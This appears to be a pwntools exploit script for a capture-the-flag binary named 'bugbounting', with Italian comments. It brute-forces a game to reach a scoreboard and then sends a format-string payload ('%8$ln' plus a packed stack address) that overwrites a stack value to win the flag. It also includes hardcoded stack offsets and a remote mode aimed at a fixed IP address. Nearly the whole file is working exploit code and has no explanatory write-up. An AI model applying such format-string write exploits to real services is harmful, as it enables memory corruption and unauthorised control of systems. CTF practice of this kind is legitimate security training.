#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bugbounting
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('bugbounting_patched')
server = None


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global server
    if args.GDB:
        server = process([exe.path] + argv, *a, **kw)
        r = remote("127.0.0.1", 37654)
        return gdb.attach(r, "break")
    elif args.REMOTE:
        return remote("131.114.59.19", 37654, *a, **kw)
    else:
        server = process([exe.path] + argv, *a, **kw)
        return remote("127.0.0.1", 37654, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def bruteforce_game(name):

    wins = 0

    io.sendline("_sunfloweroil_")
    io.sendline(name)

    io.sendline("1")

    #Entra in crisi se il giocatore avversario ha gia' usato la mossa
    while(wins < 2):
        for i in range(3):
            for j in range(3):
                result = b""
                io.sendline(str(i))
                io.sendline(str(j))
                result = io.recv()

                if(b"You win!!" in result):
                    wins += 1

                if(wins >= 2):
                    break
            if(wins >= 2):
                break
    io.sendline("2")

    return io.recv()

def get_score(blob):

    p = re.compile(b'2,\t(.*),\t2\n')
    return p.search(blob).group(1)

#Vulnerabilita' nella scoreboard
io.recv()
result = b""

#la flag viene data se il giocatore arriva primo in classifica dopo il qsort
#Il punteggio di Micene e' in pos 13

name_addr = 0x7fff3062b908
micene_addr = 0x7fff3062b8f0
micene_value = 0x656e6563694d
gemini_addr = 0x7FFF3062B938 #pos 17 value

#pos 23 ind stack che contiene ind stack 0x7fff3062b9b0
stack_stack_addr = 0x7fff3062b970

#lung max nome = 19

#for i in range(1, 100):
while(b"SCOREBOARD" not in result):
#Micene in pos 11, il suo puntatore in pos 21
#Il puntatore a nome e' in posizione 1
#Il valore di nome e' in posizione 7 e 14
        #result = bruteforce_game(f"%{i}$p")
#    result = bruteforce_game(f"%21$ln%1$ln")
    result = bruteforce_game(b"%8$ln   " + (micene_addr+8*2).to_bytes(8, "little"))

#    print(i)
#    print(get_score(result))
#    io = start()
#    result = b""
io.interactive()
